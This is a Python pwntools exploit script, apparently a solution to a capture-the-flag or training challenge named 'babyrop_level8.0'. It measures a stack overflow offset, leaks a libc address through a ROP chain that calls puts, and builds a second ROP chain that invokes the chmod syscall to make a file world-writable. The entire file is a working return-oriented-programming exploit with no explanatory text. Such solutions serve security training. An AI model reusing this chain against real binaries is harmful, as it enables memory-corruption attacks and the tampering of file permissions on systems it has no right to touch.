#!/usr/bin/env python3
from pwn import *

# INIT

context.arch='amd64'
context.log_level='CRITICAL'
elf = ELF('/challenge/babyrop_level8.0')

# CALCULATING BUFFER LENGTH
io = elf.process(setuid=False)
io.sendline(cyclic(512,n=8))
io.wait()

buff_len = int(cyclic_find(io.corefile.fault_addr,n=8))

# EXPLOITING
io = elf.process()

libc = ELF(elf.libc.path)
rop = ROP(elf)

rop.puts(elf.got.puts)
rop.call('challenge')

#PUTS(puts)

PAYLOAD = b'A'*buff_len+\
    rop.chain()
io.sendline(PAYLOAD)
io.recvuntil(b'Leaving!\n')
function_address = u64(io.recvline()[:-1].ljust(8,b'\x00'))

print(hex(function_address))
print(hex(libc.symbols.puts))
libc_addr = function_address-libc.symbols.puts
print(hex(libc_addr))

libc.address=libc_addr

###

SYSCALL = libc.address + 0x02284d
POP_RAX = libc.address + 0x036174
POP_RDI = libc.address + 0x023b6a
POP_RSI = libc.address + 0x02601f

PAYLOAD = b'A'*buff_len+\
    p64(POP_RDI)+\
    p64(next(elf.search(b'main\x00')))+\
    p64(POP_RAX)+\
    p64(0x5A) +\
    p64(POP_RSI) +\
    p64(0o777)+\
    p64(SYSCALL)

io.sendline(PAYLOAD)
io.interactive()
